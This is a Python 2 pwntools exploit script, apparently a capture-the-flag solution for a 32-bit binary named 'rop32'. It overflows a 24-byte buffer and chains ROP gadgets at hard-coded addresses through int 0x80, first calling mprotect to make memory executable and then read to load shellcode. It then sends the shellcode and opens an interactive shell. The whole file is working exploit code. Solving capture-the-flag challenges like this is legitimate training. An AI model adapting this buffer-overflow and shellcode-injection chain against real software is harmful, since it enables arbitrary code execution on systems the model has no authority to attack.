#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./rop32
from pwn import *

# Set up pwntools for the correct architecture
#exe = context.binary = ELF('./rop32')
#cd /problems/rop32_6_25951273b5c2ba8aef6860b4afeb13d8
exe = context.binary = ELF('./vuln')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *0x80488dc
continue
'''.format(**locals())

GAD_INT80 = 0x0806f7a0        #: int 0x80; ret;
GAD_POP_EAX = 0x080a8e36      #: pop eax; ret;
GAD_POP_EBX = 0x080481c9      #: pop ebx; ret;
GAD_POP_ECX_EBX = 0x0806ee92  #: pop ecx; pop ebx; ret;
GAD_POP_EAX_EDX_EBX = 0x08056334 #: pop eax; pop edx; pop ebx; ret;
GAD_POP_EDX = 0x0806ee6b      #: pop edx; ret;



def syscall(eax, ebx, ecx, edx):
  pl = ""
  pl += p32(GAD_POP_EAX_EDX_EBX)
  pl += p32(eax)
  pl += p32(edx)
  pl += p32(ebx)

  pl += p32(GAD_POP_ECX_EBX)
  pl += p32(ecx)
  pl += p32(ebx)

  pl += p32(GAD_INT80)
  return pl

io = start()
payload = "A"*24
payload += p32(0x080dc100)
#payload = cyclic()
payload += syscall(0x7d, 0x080dc000, 0x1000, 7)
payload += syscall(0x3, 0, 0x080dc200, 0x1000)
payload += p32(0x080dc200)
io.sendline(payload)
sleep(5)
payload = asm(shellcraft.sh())
io.sendline(payload)

io.interactive()

